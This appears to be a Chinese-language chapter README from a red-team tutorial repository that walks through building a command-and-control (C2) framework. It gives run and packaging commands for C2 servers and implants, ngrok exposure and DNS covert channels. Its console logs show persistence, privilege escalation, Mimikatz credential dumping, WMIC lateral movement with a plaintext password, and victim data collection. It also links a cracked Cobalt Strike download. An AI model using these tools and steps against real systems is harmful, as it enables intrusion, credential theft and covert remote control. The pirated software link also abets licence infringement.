# C2

## 基础通信

[c2_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E5%9F%BA%E7%A1%80%E9%80%9A%E4%BF%A1/c2_server.py)

```bash
python3 c2_server.py
```

[c2_client.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E5%9F%BA%E7%A1%80%E9%80%9A%E4%BF%A1/c2_client.cpp)

```bash
http://IP地址:8080/update_command?cmd="new command"
```

## 加密通信

[crypto_c2.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/crypto_c2.py)

```bash
python3 crypto_c2.py
```

[crypto_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/crypto_client.py)

```bash
pyinstaller --onefile .\crypto_client.py
```

```bash
http://IP地址:8080/update_command?cmd="New command"
```

## C2基础设施搭建

### 代理服务器

[c2_proxy_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/c2_proxy_server.py)

```bash
python3 c2_proxy_server.py
```

[c2_agent.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/c2_agent.py)

[c2_agent_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/c2_agent_client.py)

```bash
http://IP地址:8080/update_command?cmd="New command"
```

### 流量混淆

[c2_encode_wt.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/c2_encode_wt.py)

[c2_encode_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/c2_encode_client.py)

[change_command.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/change_command.py)

```bash
python3 c2_encode_wt.py
python3 c2_encode_client.py
python3 change_command.py
```

### 内网穿透

[Ngrok](https://dashboard.ngrok.com/get-started/setup/linux)

```bash
tar -zxvf ngrok软件包 -C /usr/local/bin
ngrok config add-authtoken 认证令牌
```

```bash
python3 c2_encode_wt.py
ngrok http 8080
```

[c2_ngrok.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/c2_ngrok.py)

```bash
python3 c2_ngrok.py
python3 change_command.py
```

## 隐蔽通信

[hide_wt.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E9%9A%90%E8%94%BD%E9%80%9A%E4%BF%A1/hide_wt.py)

[hide_wt_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E9%9A%90%E8%94%BD%E9%80%9A%E4%BF%A1/hide_wt_client.py)

```bash
pip3 install dnspython
python3 hide_wt.py
python3 hide_wt_client.py
python3 change_command.py
```

## C2命令执行

[c2_control.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/c2_control.py)

[c2_exec.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/c2_exec.py)

```bash
python3 c2_control.py
```

```bash
c2_exec.py
```

## C2多阶段攻击

### 持久性

[c2_per.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/c2_per.py)

```bash
pip3 install tabulate
```

[per_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/per_client.py)

```bash
python3 c2_per.py
```

```bash
python3 per_client.py
```

### 特权提升

[privesc_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/privesc_server.py)

[privesc_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/privesc_client.py)

```bash
python3 privesc_server.py
python3 privesc_client.py
```

```bash
┌──(crypto)─(root㉿kali)-[~/c2]
└─# python3 privesc_server.py
C2 Console running...
C2> Session 1 connected

C2> sessions
+------------+---------+---------------+-------+
| Session ID | System  |  IP Address   | User  |
+------------+---------+---------------+-------+
|     1      | Windows | 192.168.0.170 | apt-i |
+------------+---------+---------------+-------+
C2> set session 1
Session 1 selected
C2> use privesc
Module privesc loaded
C2> exploit
Exploit command sent to session 1
C2> Session 2 connected

C2> exec whoami /priv
```

### 横向移动

[LM_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/LM_server.py)

[LM_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/LM_client.py)

```bash
pyinstaller.exe --onefile .\LM_client.py
```

```bash
┌──(crypto)─(root㉿kali)-[~/c2]
└─# python3 LM_server.py
C2 Console running...
C2> Session 1 connected
Raw message from session 1: {"system": "Windows", "user": "administrator"}

C2> sessions
+------------+---------+---------------+---------------+
| Session ID | System  |  IP Address   |     User      |
+------------+---------+---------------+---------------+
|     1      | Windows | 192.168.0.109 | administrator |
+------------+---------+---------------+---------------+
C2> set session 1
Session 1 selected
C2> use mimikatz
Module mimikatz loaded
C2> show options
{
    "script_path": "C:\\Users\\Administrator\\Desktop\\test\\c2\\Invoke-Mimikatz.ps1"
}
C2> exploit
Exploit command sent to session 1
C2> Raw message from session 1: {"result": "CiAgLiM......"
C2> exec wmic /node:192.168.0.109 /user:Administrator /password:123qwe!@# process call create "cmd.exe /c ipconfig"
Command sent to session 1
C2> Raw message from session 1: {"result": "5omn6KGMKFdpbjMyX1Byb2Nlc3MpLT5DcmVhdGUoKQoK5pa55rOV5omn6KGM5oiQ5Yqf44CCCgrlpJblj4LmlbA6Cmluc3RhbmNlIG9mIF9fUEFSQU1FVEVSUwp7CglQcm9jZXNzSWQgPSAzODM2OwoJUmV0dXJuVmFsdWUgPSAwOwp9OwoK"}
Received from session 1: 执行(Win32_Process)->Create()

方法执行成功。
外参数:
instance of __PARAMETERS
{
        ProcessId = 3836;
        ReturnValue = 0;
};
```

### 数据收集

[DC_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/DC_server.py)

[DC_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/DC_client.py)

```bash
pyinstaller.exe --onefile .\DC_client.py
```

```bash
C2> use system_info
Module system_info loaded
C2> exploit
Exploit command sent to session 1
C2> Raw message from session 1: {"result": "Ck5hbWUgICAg......"}
Received from session 1:
Name            Manufacturer Model     TotalPhysicalMemory
----            ------------ -----     -------------------
WIN-DBR3H49FQJ3 VMware, Inc. VMware7,1          2146439168

C2> use network_info
Module network_info loaded
C2> exploit
Exploit command sent to session 1
C2> Raw message from session 1: {"result": "CgpJUEFkZHJlc3M......"

C2> use file_search
Module file_search loaded
C2> exploit
Exploit command sent to session 1
C2> Raw message from session 1: {"result": ""}
```

## 常见C2工具

### Cobalt Strike

破解版下载：

[CobaltStrike4.9.1.zip](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/%E5%B8%B8%E8%A7%81C2%E5%B7%A5%E5%85%B7/CobaltStrike4.9.1.zip)

Profile:

[Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)

[malleable-c2](https://github.com/threatexpress/malleable-c2)

### Covenant

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable docker --now
docker
apt install -y docker-ce docker-ce-cli containerd.io
git clone --recurse-submodules https://github.com/cobbr/Covenant /usr/src/Covenant
cd /usr/src/Covenant
git config --global --add safe.directory /usr/src/Covenant
git submodule update --init --recursive
cd Covenant
docker build -t covenant .
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /usr/src/Covenant/Covenant/Data:/app/Data covenant
docker start covenant -ai
```

文档：

[Covenant](https://github.com/cobbr/Covenant/wiki)

### sliver

[sliver](https://github.com/BishopFox/sliver/releases)

文档：

[sliver docs](https://sliver.sh/docs)


### C2Matrix

[C2Matrix](https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit?gid=0#gid=0)
